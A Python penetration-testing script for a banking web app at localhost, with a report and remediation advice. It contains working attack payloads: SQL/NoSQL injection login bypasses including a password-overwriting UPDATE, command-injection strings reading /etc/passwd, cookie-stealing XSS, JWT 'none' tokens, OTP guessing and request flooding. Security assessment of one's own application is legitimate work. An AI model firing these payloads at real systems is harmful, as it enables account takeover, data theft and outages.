#!/usr/bin/env python3
"""
Professional Penetration Testing Suite for Banking Application
Comprehensive security assessment tools for ethical hacking
"""

import requests
import time
import json
import base64
import hashlib
import threading
from datetime import datetime
import subprocess
import sys

class BankingPenetrationTester:
    def __init__(self, target_url="http://localhost:5000"):
        self.target = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.report = {
            'timestamp': datetime.now().isoformat(),
            'target': target_url,
            'tests_performed': [],
            'vulnerabilities': [],
            'recommendations': []
        }
        
    def log_finding(self, severity, category, description, proof_of_concept=None):
        """Log security findings"""
        finding = {
            'severity': severity,
            'category': category,
            'description': description,
            'proof_of_concept': proof_of_concept,
            'timestamp': datetime.now().isoformat()
        }
        self.vulnerabilities.append(finding)
        print(f"[{severity}] {category}: {description}")
        
    def reconnaissance(self):
        """Information gathering phase"""
        print("\nüîç Phase 1: Reconnaissance")
        print("-" * 40)
        
        try:
            # Banner grabbing
            response = self.session.get(self.target)
            server_header = response.headers.get('Server', 'Unknown')
            print(f"Server: {server_header}")
            
            # Technology detection
            if 'flask' in response.headers.get('Server', '').lower():
                print("‚úÖ Detected: Flask web framework")
                
            # Endpoint discovery
            endpoints = [
                '/api/auth/login',
                '/api/auth/register', 
                '/api/auth/verify-otp',
                '/api/dashboard/user',
                '/admin',
                '/debug',
                '/.env',
                '/robots.txt'
            ]
            
            print("\nüì° Endpoint Discovery:")
            for endpoint in endpoints:
                try:
                    resp = self.session.get(f"{self.target}{endpoint}")
                    status = "‚úÖ" if resp.status_code < 400 else "‚ùå"
                    print(f"{status} {endpoint} - Status: {resp.status_code}")
                    
                    if endpoint == '/.env' and resp.status_code == 200:
                        self.log_finding("CRITICAL", "Information Disclosure", 
                                       ".env file accessible", resp.text[:200])
                        
                except:
                    pass
                    
        except Exception as e:
            print(f"‚ùå Reconnaissance failed: {e}")
            
    def authentication_bypass_tests(self):
        """Test authentication bypass vulnerabilities"""
        print("\nüîê Phase 2: Authentication Bypass Tests")
        print("-" * 40)
        
        # SQL injection in login
        sql_payloads = [
            {"account_number": "admin' OR '1'='1", "password": "anything"},
            {"account_number": "' UNION SELECT 1,2,3,4,5--", "password": "test"},
            {"account_number": "'; UPDATE users SET password='hacked'--", "password": "test"}
        ]
        
        for payload in sql_payloads:
            try:
                response = self.session.post(f"{self.target}/api/auth/login", json=payload)
                if response.status_code == 200 and "token" in response.text:
                    self.log_finding("CRITICAL", "SQL Injection", 
                                   "Authentication bypass via SQL injection", payload)
            except:
                pass
                
        # NoSQL injection attempts
        nosql_payloads = [
            {"account_number": {"$ne": ""}, "password": {"$ne": ""}},
            {"account_number": {"$regex": ".*"}, "password": {"$regex": ".*"}}
        ]
        
        for payload in nosql_payloads:
            try:
                response = self.session.post(f"{self.target}/api/auth/login", json=payload)
                if response.status_code == 200:
                    self.log_finding("HIGH", "NoSQL Injection", 
                                   "Potential NoSQL injection vulnerability", payload)
            except:
                pass
                
    def otp_security_assessment(self):
        """Comprehensive OTP security testing"""
        print("\nüì± Phase 3: OTP Security Assessment")
        print("-" * 40)
        
        # Test OTP generation predictability
        account = "1234567890"
        password = "password123"
        
        # Trigger multiple OTP generations
        otp_times = []
        for i in range(5):
            try:
                response = self.session.post(f"{self.target}/api/auth/login",
                                           json={"account_number": account, "password": password})
                otp_times.append(time.time())
                time.sleep(1)
            except:
                pass
                
        # Test OTP brute force protection
        print("üî• Testing OTP brute force protection...")
        attempts = 0
        for otp in ['000000', '111111', '123456', '654321', '999999']:
            try:
                response = self.session.post(f"{self.target}/api/auth/verify-otp",
                                           json={"account_number": account, "otp": otp})
                attempts += 1
                
                if response.status_code == 200 and "token" in response.text:
                    self.log_finding("CRITICAL", "OTP Compromise", 
                                   f"OTP cracked: {otp}")
                    break
                    
            except:
                pass
                
        if attempts >= 5:
            self.log_finding("MEDIUM", "Rate Limiting Issue", 
                           "Multiple OTP attempts allowed without blocking")
            
    def session_management_tests(self):
        """Test session and JWT security"""
        print("\nüé´ Phase 4: Session Management Tests")
        print("-" * 40)
        
        # Test JWT vulnerabilities
        jwt_attacks = [
            # None algorithm attack
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            # Empty signature
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            # Invalid format
            "invalid.jwt.token"
        ]
        
        for token in jwt_attacks:
            try:
                headers = {"Authorization": f"Bearer {token}"}
                response = self.session.get(f"{self.target}/api/dashboard/user", headers=headers)
                
                if response.status_code == 200:
                    self.log_finding("HIGH", "JWT Bypass", 
                                   f"JWT validation bypassed with: {token[:30]}...")
            except:
                pass
                
    def input_validation_tests(self):
        """Test input validation and injection attacks"""
        print("\nüìù Phase 5: Input Validation Tests")
        print("-" * 40)
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'><script>alert(document.cookie)</script>"
        ]
        
        for payload in xss_payloads:
            try:
                # Test in registration
                data = {
                    "name": payload,
                    "email": "test@example.com",
                    "password": "password123"
                }
                response = self.session.post(f"{self.target}/api/auth/register", json=data)
                
                if payload in response.text and response.status_code == 200:
                    self.log_finding("HIGH", "XSS Vulnerability", 
                                   f"Reflected XSS in registration: {payload}")
            except:
                pass
                
        # Command injection tests
        cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "& dir",
            "`id`"
        ]
        
        for payload in cmd_payloads:
            try:
                data = {"name": f"user{payload}", "email": "test@example.com", "password": "test"}
                response = self.session.post(f"{self.target}/api/auth/register", json=data)
                
                # Check for command execution indicators
                if any(indicator in response.text for indicator in ['root:', 'uid=', 'gid=']):
                    self.log_finding("CRITICAL", "Command Injection", 
                                   f"Command injection possible: {payload}")
            except:
                pass
                
    def business_logic_tests(self):
        """Test business logic vulnerabilities"""
        print("\nüí∞ Phase 6: Business Logic Tests")
        print("-" * 40)
        
        # Test account enumeration
        test_accounts = ["0000000000", "1111111111", "9999999999"]
        timing_differences = []
        
        for account in test_accounts:
            start_time = time.time()
            try:
                response = self.session.post(f"{self.target}/api/auth/login",
                                           json={"account_number": account, "password": "wrongpass"})
                end_time = time.time()
                timing_differences.append(end_time - start_time)
            except:
                pass
                
        # Check for timing differences that could indicate valid accounts
        if max(timing_differences) - min(timing_differences) > 0.5:
            self.log_finding("MEDIUM", "Account Enumeration", 
                           "Timing differences may reveal valid account numbers")
            
        # Test privilege escalation
        try:
            # Attempt to access admin endpoints
            admin_endpoints = ["/api/admin/users", "/api/admin/transactions", "/api/admin/config"]
            for endpoint in admin_endpoints:
                response = self.session.get(f"{self.target}{endpoint}")
                if response.status_code != 404:
                    self.log_finding("MEDIUM", "Information Disclosure", 
                                   f"Admin endpoint accessible: {endpoint}")
        except:
            pass
            
    def denial_of_service_tests(self):
        """Test DoS vulnerabilities"""
        print("\nüí• Phase 7: Denial of Service Tests")
        print("-" * 40)
        
        # Test resource exhaustion
        try:
            # Large payload test
            large_payload = {"name": "A" * 10000, "email": "test@example.com", "password": "test"}
            response = self.session.post(f"{self.target}/api/auth/register", 
                                       json=large_payload, timeout=10)
            
            if response.status_code == 500:
                self.log_finding("MEDIUM", "DoS Vulnerability", 
                               "Large payload causes server error")
        except requests.exceptions.Timeout:
            self.log_finding("HIGH", "DoS Vulnerability", 
                           "Large payload causes timeout")
        except:
            pass
            
        # Rapid request test
        print("üîÑ Testing rate limiting...")
        rapid_requests = 0
        for i in range(50):
            try:
                response = self.session.get(f"{self.target}/api/auth/login")
                if response.status_code != 429:  # Not rate limited
                    rapid_requests += 1
            except:
                break
                
        if rapid_requests > 30:
            self.log_finding("MEDIUM", "Rate Limiting", 
                           f"Allowed {rapid_requests} rapid requests without blocking")
            
    def generate_penetration_report(self):
        """Generate comprehensive penetration testing report"""
        print("\n" + "=" * 60)
        print("üéØ PENETRATION TESTING REPORT")
        print("=" * 60)
        
        print(f"Target: {self.target}")
        print(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total Vulnerabilities Found: {len(self.vulnerabilities)}")
        
        # Categorize vulnerabilities by severity
        critical = len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL'])
        high = len([v for v in self.vulnerabilities if v['severity'] == 'HIGH'])
        medium = len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM'])
        low = len([v for v in self.vulnerabilities if v['severity'] == 'LOW'])
        
        print(f"\nSeverity Breakdown:")
        print(f"üî¥ Critical: {critical}")
        print(f"üü† High: {high}")
        print(f"üü° Medium: {medium}")
        print(f"üü¢ Low: {low}")
        
        if self.vulnerabilities:
            print(f"\nüìã DETAILED FINDINGS:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. [{vuln['severity']}] {vuln['category']}")
                print(f"   Description: {vuln['description']}")
                if vuln['proof_of_concept']:
                    print(f"   PoC: {str(vuln['proof_of_concept'])[:100]}...")
        else:
            print("\n‚úÖ No vulnerabilities found! Your application appears secure.")
            
        # Security recommendations
        print(f"\nüõ°Ô∏è  SECURITY RECOMMENDATIONS:")
        recommendations = [
            "Implement parameterized queries to prevent SQL injection",
            "Use strong JWT secrets and proper validation",
            "Implement comprehensive input validation and sanitization",
            "Add rate limiting on all authentication endpoints",
            "Use HTTPS for all communications",
            "Implement proper session management",
            "Add logging and monitoring for security events",
            "Regular security testing and code reviews",
            "Implement multi-factor authentication",
            "Use security headers (HSTS, CSP, etc.)"
        ]
        
        for i, rec in enumerate(recommendations, 1):
            print(f"{i}. {rec}")
            
        # Save detailed report
        self.report['vulnerabilities'] = self.vulnerabilities
        self.report['recommendations'] = recommendations
        
        with open('penetration_test_report.json', 'w') as f:
            json.dump(self.report, f, indent=2)
            
        print(f"\nüíæ Detailed report saved to: penetration_test_report.json")
        print(f"üìä Executive summary available for stakeholders")
        
    def run_full_penetration_test(self):
        """Execute complete penetration testing suite"""
        print("üöÄ STARTING PROFESSIONAL PENETRATION TEST")
        print("‚ö†Ô∏è  ETHICAL HACKING - USE ONLY ON YOUR OWN APPLICATIONS")
        print("=" * 60)
        
        self.reconnaissance()
        self.authentication_bypass_tests()
        self.otp_security_assessment()
        self.session_management_tests()
        self.input_validation_tests()
        self.business_logic_tests()
        self.denial_of_service_tests()
        
        self.generate_penetration_report()

if __name__ == "__main__":
    print("‚ö†Ô∏è  PROFESSIONAL PENETRATION TESTING SUITE")
    print("This tool performs comprehensive security testing")
    print("Use only on applications you own and have permission to test!")
    
    pen_tester = BankingPenetrationTester()
    pen_tester.run_full_penetration_test()